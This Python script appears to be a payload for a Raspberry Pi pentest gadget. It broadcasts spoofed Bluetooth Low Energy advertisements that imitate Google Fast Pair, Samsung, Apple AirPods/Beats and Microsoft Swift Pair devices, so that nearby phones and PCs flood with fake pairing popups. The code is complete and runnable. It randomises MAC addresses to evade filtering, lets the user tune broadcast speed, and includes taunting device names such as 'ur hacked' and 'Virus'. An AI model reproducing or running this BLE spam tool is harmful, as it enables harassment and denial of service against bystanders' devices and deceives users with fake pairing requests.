#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE Spam (iOS / Android / Windows)
========================================================
Author: 7h30th3r0n3

Broadcast crafted BLE advertisements to trigger popup notifications
on nearby devices.

Setup / Prerequisites:
  - Requires Bluetooth adapter (hci0).
  - Targets: iOS (Apple Proximity), Android (Google FastPair),
    Windows (Swift Pair).

Supported popup types:
  - FastPair (Android): "Device found nearby" popups
  - Proximity Pairing (iOS): fake AirPods/Beats pairing requests
  - Swift Pair (Windows): Bluetooth device pairing popups

Uses hcitool/hciconfig on hci0.

Controls:
  OK        -- Start / stop spam
  KEY1      -- Cycle mode (FastPair / iOS / Windows / ALL)
  UP / DOWN -- Adjust broadcast speed
  KEY3      -- Exit
"""

import os
import sys
import time
import random
import struct
import threading
import subprocess

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_bt_interface

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
HCI_DEV = None  # set in main() via select_bt_interface
MODES = ["FastPair", "Samsung", "iOS", "Windows", "ALL"]
SPEED_LEVELS = [150, 80, 30, 10, 0]  # ms between broadcasts
SPEED_LABELS = ["Slow", "Med", "Fast", "Vfast", "Max"]

# Google Fast Pair model IDs (real registered device IDs)
FASTPAIR_MODELS = [
    b"\x2C\x01\x00",  # Pixel Buds A
    b"\xDA\x2B\x00",  # Pixel Buds Pro
    b"\x8B\x66\x00",  # Pixel Buds Pro 2
    b"\x06\xB7\x00",  # JBL Flip 6
    b"\x72\xEF\x00",  # JBL Charge 5
    b"\x30\x56\x00",  # Sony WH-1000XM4
    b"\xF5\x25\x00",  # Sony WH-1000XM5
    b"\xE4\x2D\x00",  # Sony WF-1000XM4
    b"\x39\x48\x00",  # Samsung Galaxy Buds2 Pro
    b"\x51\x30\x00",  # Samsung Galaxy Buds FE
    b"\xC9\x9D\x00",  # Samsung Galaxy Buds Live
    b"\x0A\xAB\x00",  # Samsung Galaxy Buds2
    b"\xED\x73\x00",  # Bose QC45
    b"\xC9\x22\x00",  # Bose QC Earbuds
    b"\x09\x64\x00",  # Nothing Ear (1)
    b"\xCB\x01\x00",  # Google Home Mini
]

# Samsung BLE device model IDs (company 0x0075)
SAMSUNG_MODELS = [
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15,
    0x16, 0x17, 0x18, 0xE4, 0xE5, 0x1B, 0x1C, 0x1D, 0x1E,
    0x20, 0xEC, 0xEF,
]

# Apple Continuity protocol device types + model IDs
# Format: (type_byte, model_id, name)
APPLE_DEVICES = [
    (0x07, 0x01, "AirPods"),
    (0x07, 0x02, "AirPods Pro"),
    (0x07, 0x03, "AirPods Max"),
    (0x07, 0x04, "AirPods 3"),
    (0x07, 0x05, "Beats Fit Pro"),
    (0x07, 0x06, "Beats Solo 3"),
    (0x07, 0x07, "Beats Studio 3"),
    (0x07, 0x08, "PowerBeats 3"),
    (0x07, 0x09, "Beats X"),
    (0x07, 0x0A, "AirPods Pro 2"),
    (0x07, 0x0B, "Beats Solo Buds"),
    (0x07, 0x0C, "Beats Pill+"),
    (0x07, 0x0E, "AirPods 4"),
    (0x07, 0x0F, "Beats Flex"),
    (0x07, 0x10, "AirTag"),
    (0x07, 0x14, "HomePod"),
    (0x07, 0x19, "AppleTV 4K"),
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
spamming = False
mode_idx = 0
speed_idx = 2       # default: Fast (100ms)
packets_sent = 0
last_error = ""
last_device = ""


# ---------------------------------------------------------------------------
# HCI helpers
# ---------------------------------------------------------------------------

def _hci_up():
    """Stop bluetoothd (it blocks raw HCI) and bring adapter up."""
    subprocess.run(
        ["sudo", "systemctl", "stop", "bluetooth"],
        capture_output=True, timeout=5,
    )
    subprocess.run(
        ["sudo", "hciconfig", HCI_DEV, "down"],
        capture_output=True, timeout=5,
    )
    subprocess.run(
        ["sudo", "hciconfig", HCI_DEV, "up"],
        capture_output=True, timeout=5,
    )
    time.sleep(0.3)


def _hci_set_adv_data(hex_bytes):
    """Set advertising data via hcitool cmd.

    Sends exactly 31 bytes: first byte = data length, rest = data padded to 30.
    This matches the exact format confirmed to trigger Windows Swift Pair popups.
    """
    data = list(hex_bytes)
    data_len = len(data)
    # Pad data to 30 bytes
    while len(data) < 30:
        data.append(0x00)
    data = data[:30]
    # Final: [length] + [30 bytes data] = 31 bytes total
    full = [data_len] + data
    hex_str = " ".join(f"{b:02X}" for b in full)
    cmd = (
        f"sudo hcitool -i {HCI_DEV} cmd 0x08 0x0008 "
        f"{hex_str}"
    )
    return subprocess.run(
        cmd.split(), capture_output=True, text=True, timeout=5,
    )


def _hci_enable_adv():
    """Enable LE advertising."""
    subprocess.run(
        ["sudo", "hcitool", "-i", HCI_DEV, "cmd", "0x08", "0x000a", "01"],
        capture_output=True, timeout=5,
    )


def _hci_disable_adv():
    """Disable LE advertising."""
    subprocess.run(
        ["sudo", "hcitool", "-i", HCI_DEV, "cmd", "0x08", "0x000a", "00"],
        capture_output=True, timeout=5,
    )


def _hci_set_adv_params():
    """Set advertising parameters for connectable undirected (Swift Pair compatible).

    ADV_IND (0x00) = connectable — required for Swift Pair notifications.
    Fast interval (0x0020 = 20ms) for quick Windows detection.
    """
    subprocess.run(
        [
            "sudo", "hcitool", "-i", HCI_DEV, "cmd",
            "0x08", "0x0006",
            "20", "00",   # min interval: 0x0020 = 20ms (fast for Swift Pair)
            "20", "00",   # max interval: 0x0020 = 20ms
            "00",         # adv type: ADV_IND (connectable undirected)
            "01",         # own address type: RANDOM
            "00",         # peer address type
            "00", "00", "00", "00", "00", "00",  # peer address
            "07",         # channel map (all 3 channels)
            "00",         # filter policy
        ],
        capture_output=True, timeout=5,
    )


def _hci_reset():
    """Reset the HCI device between advertisement cycles."""
    subprocess.run(
        ["sudo", "hciconfig", HCI_DEV, "reset"],
        capture_output=True, timeout=5,
    )


def _randomize_mac():
    """Set a random BLE address so each advert looks like a new device.

    Uses LE Set Random Address HCI command (0x08 0x0005) which sets
    the address used for advertising when using random address type.
    Also changes adv params to use random address (own_addr_type=1).
    """
    mac_bytes = [random.randint(0, 255) for _ in range(6)]
    # Set top 2 bits of first byte for static random address
    mac_bytes[0] = (mac_bytes[0] | 0xC0)
    mac_hex = " ".join(f"{b:02X}" for b in mac_bytes)
    # LE Set Random Address (OGF 0x08, OCF 0x0005)
    subprocess.run(
        ["sudo", "hcitool", "-i", HCI_DEV, "cmd", "0x08", "0x0005"] + mac_hex.split(),
        capture_output=True, timeout=5,
    )


def _broadcast_once(adv_bytes, label):
    """Broadcast one advertisement at max speed using single bash call.

    Combines: disable → random MAC → set params → set data → enable
    into one subprocess for minimal overhead (~50ms total).
    Keeps advertising active for 100ms then disables (enough for
    Windows to detect and trigger Swift Pair notification).
    """
    global packets_sent, last_error, last_device

    try:
        # Random MAC
        mac = [random.randint(0, 255) for _ in range(6)]
        mac[0] = mac[0] | 0xC0
        mac_hex = " ".join(f"{b:02X}" for b in mac)

        # Adv data hex
        data = list(adv_bytes)
        data_len = len(data)
        while len(data) < 30:
            data.append(0)
        hex_str = " ".join(f"{b:02X}" for b in data)
        total_len = f"{data_len:02X}"

        # Single bash call — all HCI commands chained
        script = (
            f"hcitool -i {HCI_DEV} cmd 0x08 0x000a 00 >/dev/null 2>&1;"
            f"hcitool -i {HCI_DEV} cmd 0x08 0x0005 {mac_hex} >/dev/null 2>&1;"
            f"hcitool -i {HCI_DEV} cmd 0x08 0x0006 20 00 20 00 00 01 00 "
            f"00 00 00 00 00 00 07 00 >/dev/null 2>&1;"
            f"hcitool -i {HCI_DEV} cmd 0x08 0x0008 {total_len} {hex_str} >/dev/null 2>&1;"
            f"hcitool -i {HCI_DEV} cmd 0x08 0x000a 01 >/dev/null 2>&1;"
            f"sleep 0.1;"
            f"hcitool -i {HCI_DEV} cmd 0x08 0x000a 00 >/dev/null 2>&1"
        )
        subprocess.run(["sudo", "bash", "-c", script],
                       capture_output=True, timeout=3)

        with lock:
            packets_sent += 1
            last_device = label
        return True
    except subprocess.TimeoutExpired:
        with lock:
            last_error = "Timeout"
        return False
    except Exception as exc:
        with lock:
            last_error = str(exc)[:30]
        return False


# ---------------------------------------------------------------------------
# Advertisement builders
# ---------------------------------------------------------------------------

def _build_fastpair_adv():
    """Build Google Fast Pair advertisement (Service Data format)."""
    model = random.choice(FASTPAIR_MODELS)
    adv = bytearray([
        0x02, 0x01, 0x06,          # Flags: LE General + BR/EDR not supported
        0x06, 0x16,                 # Length=6, Type=Service Data
        0x2C, 0xFE,                 # UUID 0xFE2C (Google FastPair, LE)
    ])
    adv.extend(model)
    label = f"FP:{model.hex()}"
    return bytes(adv), label


def _build_samsung_adv():
    """Build Samsung BLE advertisement (Momentum format)."""
    model = random.choice(SAMSUNG_MODELS)
    adv = bytearray([
        0x02, 0x01, 0x06,          # Flags
        0x0E, 0xFF,                 # Length=14, Type=Manufacturer Specific
        0x75, 0x00,                 # Samsung Company ID (0x0075 LE)
        0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00,
        0x00, 0x43,
        model,                      # Device model
    ])
    label = f"Sam:{model:02X}"
    return bytes(adv), label


def _build_ios_adv():
    """Build Apple Continuity Proximity Pairing advertisement."""
    dev_type, model_id, name = random.choice(APPLE_DEVICES)
    # Full Apple Continuity frame
    adv = bytearray([
        0x02, 0x01, 0x06,          # Flags
        0x1A, 0xFF,                 # Length=26, Type=Manufacturer Specific
        0x4C, 0x00,                 # Apple Company ID (0x004C LE)
        dev_type,                   # Continuity type (0x07 = proximity)
        0x19,                       # Length of following data
        model_id,                   # Device model
        0x55,                       # Status: lid open + color
    ])
    # Pad with random bytes (encryption nonce / auth tag)
    adv.extend(bytes(random.randint(0, 255) for _ in range(22)))
    adv = adv[:30]
    return bytes(adv), name


SWIFT_PAIR_NAMES = [
    "Speaker", "Keyboard", "Mouse", "Headset",
    "Earbuds", "Gamepad", "Display", "Webcam",
    "\U0001F480 pwned", "\U0001F525 ur hacked", "\U00002620 oops",
    "\U0001F916 beep boop", "\U0001F47E game over", "\U0001F47B boo!",
    "\U0001F4A9 lol", "\U0001F608 hehe", "\U0001F92F mind=blown",
    "FBI Van", "NSA Mic", "CIA Cam", "Hak5",
    "fsociety", "MrRobot", "Pwned!", "HACK",
    "rm -rf /", "Skynet", "HAL9000", "JARVIS",
    "AirPods", "Buds Pro", "Bose QC", "JBL Go",
    "Xbox", "PS5 Pad", "Switch", "Stadia",
    "Free BT", "TrustMe", "NotASpy", "Candy",
    "Error", "Loading", "Virus", "Trojan",
    "Kali BT", "Parrot", "Pwnage", "L33T",
]

def _build_swiftpair_adv():
    """Build Microsoft Swift Pair advertisement per official spec.

    Requirements from Microsoft docs:
    - ADV_IND (connectable) — set in _hci_set_adv_params
    - Microsoft vendor section: company 0x0006, beacon 0x03, sub-scenario, RSSI 0x80
    - Device name OR CoD in the SAME advertisement
    - Fast beacon interval (20ms)
    """
    name = random.choice(SWIFT_PAIR_NAMES)
    name_bytes = name.encode("utf-8")[:10]
    name_len = len(name_bytes)

    # LE-only payload (sub-scenario 0x00): simplest, just vendor section
    adv = bytearray([
        0x02, 0x01, 0x06,          # Flags: LE General + BR/EDR not supported
    ])

    # Microsoft vendor section (required for Swift Pair trigger)
    vendor = bytearray([
        0x06, 0x00,                 # Microsoft Company ID (0x0006 LE)
        0x03,                       # Microsoft Beacon ID (Swift Pair)
        0x00,                       # Sub-scenario: LE only pairing
        0x80,                       # Reserved RSSI byte (must be 0x80)
    ])
    adv.append(len(vendor) + 1)     # AD length
    adv.append(0xFF)                # AD type: Manufacturer Specific Data
    adv.extend(vendor)

    # LE Appearance (gives Windows the device icon)
    appearances = [
        [0xC1, 0x03],  # Keyboard (0x03C1)
        [0xC2, 0x03],  # Mouse (0x03C2)
        [0x41, 0x02],  # Headset (0x0241)
        [0x42, 0x02],  # Earbuds (0x0242)
        [0x43, 0x08],  # Gamepad (0x0843)
        [0x81, 0x02],  # Speaker (0x0281)
    ]
    appearance = random.choice(appearances)
    adv.extend([0x03, 0x19])        # AD length=3, type=Appearance
    adv.extend(appearance)

    # Shortened Local Name (so Windows shows "New [Name] found")
    adv.append(name_len + 1)        # AD length
    adv.append(0x08)                # AD type: Shortened Local Name
    adv.extend(name_bytes)

    adv = adv[:31]
    return bytes(adv), f"SP:{name}"


# ---------------------------------------------------------------------------
# Spam thread
# ---------------------------------------------------------------------------

def _spam_loop():
    """Main spam loop: cycle through device advertisements."""
    while True:
        with lock:
            if not spamming:
                break
            current_mode = MODES[mode_idx]
            delay_ms = SPEED_LEVELS[speed_idx]

        builders = []
        if current_mode in ("FastPair", "ALL"):
            builders.append(_build_fastpair_adv)
        if current_mode in ("Samsung", "ALL"):
            builders.append(_build_samsung_adv)
        if current_mode in ("iOS", "ALL"):
            builders.append(_build_ios_adv)
        if current_mode in ("Windows", "ALL"):
            builders.append(_build_swiftpair_adv)

        if not builders:
            time.sleep(0.1)
            continue

        builder = random.choice(builders)
        adv_bytes, label = builder()
        _broadcast_once(adv_bytes, label)

        time.sleep(delay_ms / 1000.0)


def _start_spam():
    """Start spamming in a background thread."""
    global spamming
    with lock:
        if spamming:
            return
        spamming = True
    _hci_reset()
    time.sleep(0.3)
    _hci_up()
    time.sleep(0.1)
    threading.Thread(target=_spam_loop, daemon=True).start()


def _stop_spam():
    """Stop spamming and disable advertising."""
    global spamming
    with lock:
        spamming = False
    time.sleep(0.2)
    try:
        _hci_disable_adv()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "BLE SPAM", font=font, fill="#FF00FF")
    with lock:
        active = spamming
    indicator = "#00FF00" if active else "#FF0000"
    d.ellipse((118, 3, 122, 7), fill=indicator)

    with lock:
        mode = MODES[mode_idx]
        spd_idx = speed_idx
        sent = packets_sent
        err = last_error
        dev = last_device

    # Mode
    y = 18
    mode_colors = {
        "FastPair": "#4CAF50",
        "iOS": "#2196F3",
        "Windows": "#FF9800",
        "ALL": "#FF00FF",
    }
    d.text((2, y), f"Mode: {mode}", font=font, fill=mode_colors.get(mode, "#FFF"))
    y += 14

    # Speed
    d.text((2, y), f"Speed: {SPEED_LABELS[spd_idx]} ({SPEED_LEVELS[spd_idx]}ms)",
           font=font, fill="#888")
    y += 14

    # Packets
    d.text((2, y), f"Packets: {sent}", font=font, fill="#00FF00")
    y += 14

    # Last device
    if dev:
        d.text((2, y), f"Last: {dev[:20]}", font=font, fill="#CCCCCC")
    y += 14

    # Error
    if err:
        d.text((2, y), f"Err: {err[:20]}", font=font, fill="#FF4444")

    # Mode description
    y = 94
    descriptions = {
        "FastPair": "Android popups",
        "iOS": "AirPods/Beats fake",
        "Windows": "Swift Pair popups",
        "ALL": "All platforms",
    }
    d.text((2, y), descriptions.get(mode, ""), font=font, fill="#555")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    label = "OK:Stop" if active else "OK:Start"
    d.text((2, 117), f"{label} K1:Mode K3:X", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global mode_idx, speed_idx, HCI_DEV

    HCI_DEV = select_bt_interface(LCD, font, PINS, GPIO)
    if not HCI_DEV:
        GPIO.cleanup()
        return 1

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 10), "BLE SPAM", font=font, fill="#FF00FF")
    d.text((4, 28), "Popup generator for:", font=font, fill="#888")
    d.text((8, 42), "Android (FastPair)", font=font, fill="#4CAF50")
    d.text((8, 54), "iOS (Proximity)", font=font, fill="#2196F3")
    d.text((8, 66), "Windows (SwiftPair)", font=font, fill="#FF9800")
    d.text((4, 84), "OK=Start  K1=Mode", font=font, fill="#666")
    d.text((4, 96), "UP/DN=Speed K3=Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.5)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            if btn == "OK":
                with lock:
                    active = spamming
                if active:
                    _stop_spam()
                else:
                    _start_spam()
                time.sleep(0.3)

            elif btn == "KEY1":
                with lock:
                    mode_idx = (mode_idx + 1) % len(MODES)
                time.sleep(0.25)

            elif btn == "UP":
                with lock:
                    speed_idx = max(0, speed_idx - 1)
                time.sleep(0.2)

            elif btn == "DOWN":
                with lock:
                    speed_idx = min(len(SPEED_LEVELS) - 1, speed_idx + 1)
                time.sleep(0.2)

            _draw_screen()
            time.sleep(0.05)

    finally:
        _stop_spam()
        # Restore bluetoothd
        subprocess.run(["sudo", "systemctl", "start", "bluetooth"],
                       capture_output=True, timeout=5)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
